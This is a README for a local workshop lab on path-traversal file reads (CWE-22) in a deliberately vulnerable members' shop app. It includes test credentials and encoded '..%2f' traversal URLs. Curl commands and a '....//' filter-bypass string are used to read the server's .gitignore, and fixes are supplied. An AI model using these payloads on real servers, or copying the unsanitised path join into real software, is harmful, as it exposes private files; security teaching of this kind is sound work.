# Path traversal

Member shop continuation from **[CSRF](../CSRF/)** (port **3003**). On port **3004** the vulnerable feature is chapter download:

```http
GET /library/books/{book}/chapters/{file}
```

(CWE-22 **read** — not CSRF, not file upload.)

**Buy now** is shop continuity only; chapter download requires **sign-in**, not purchase.

- **Port:** `3004`
- **Accounts:** `marc` / `marc123`, `ewa` / `ewa123`

## Run

```bash
cd server
npm install
npm run dev
```

Open **`http://localhost:3004/login`** (stay on `localhost` for the whole lab — cookies do not carry to `127.0.0.1`).

## Layout

```text
server/
  content/library/books/{book}/chapters/   # intended chapter files
  .gitignore                                 # traversal target (not served as static)
  public/uploads/                            # next lab — rules in .gitignore
```

## API (this lab)

| Request | Meaning |
|---------|---------|
| `GET /library/books/gone-with-the-wind/chapters/chapter-01.txt` | Legal chapter (after login) |
| `…/chapters/..%2f..%2f..%2f..%2f..%2f.gitignore` | Traversal (main exercise — exercise 2) |

Handler joins `content/library/books/{book}/chapters/` + user-controlled path segment(s) — see [`routes/library.ts`](server/src/routes/library.ts).

## Why not plain `../` in the address bar?

Clients often **normalize** paths. For example, this URL:

```http
/library/books/gone-with-the-wind/chapters/../../../../../.gitignore
```

may be sent as:

```http
/.gitignore
```

That request **never hits** the library route (no handler → **404**). The app is still vulnerable when the payload reaches `/library/books/…/chapters/…` with traversal inside the segment — use **encoded slashes** below or `curl --path-as-is` in demos.

## Exercises

**CWE-22** · WSTG ATHZ-01 · optional **CWE-35** / **CWE-36** (README).

### 1. Legal download

Login as `marc` → `/members` → **Pobierz rozdział 1 (TXT)**.

### 2. Encoded traversal (`%2f`) — primary attack

Same idea as WSTG: one path segment, slashes as `%2f`. Target: [`server/.gitignore`](server/.gitignore) (upload rules, not meant for members).

Paste in the address bar while signed in:

```http
http://localhost:3004/library/books/gone-with-the-wind/chapters/..%2f..%2f..%2f..%2f..%2f.gitignore
```

You should see the `.gitignore` text (e.g. `public/uploads/*`).

Five `%2f` steps climb from `…/chapters/` to the `server/` directory, then `.gitignore`.

**curl:**

```bash
curl -c /tmp/pt.jar -b /tmp/pt.jar -X POST http://localhost:3004/login \
  -d 'login=marc&password=marc123' -L -o /dev/null

curl -b /tmp/pt.jar \
  'http://localhost:3004/library/books/gone-with-the-wind/chapters/..%2f..%2f..%2f..%2f..%2f.gitignore'
```

Uploaded files stay out of git — see [server/.gitignore](server/.gitignore).

### 3. Plain `../` segments (optional demo)

Only when the client sends the path **without** normalizing:

```bash
curl -b /tmp/pt.jar --path-as-is \
  'http://localhost:3004/library/books/gone-with-the-wind/chapters/../../../../../.gitignore'
```

Browsers usually normalize this form — use exercise 2 on the workshop floor.

### 4. (Optional) Bad `replace("../")` bypass

Enable **Exercise 4** block in [`routes/library.ts`](server/src/routes/library.ts), then try a single segment such as:

```text
....//....//....//....//....//.gitignore
```

(CWE-35 debrief.)

### Fix

Uncomment **fix A** (jail under `…/chapters/`) or **fix B** (allowlist `bookSlug` + `chapterFile`) in [`routes/library.ts`](server/src/routes/library.ts). Repeat exercise 2 → **Not allowed** / **403**.

## Next module

**File upload** → `POST /account/avatar` into `public/uploads/` (CWE-434). Ignore rules: [server/.gitignore](server/.gitignore). Read vs write: different URL, different fixes.
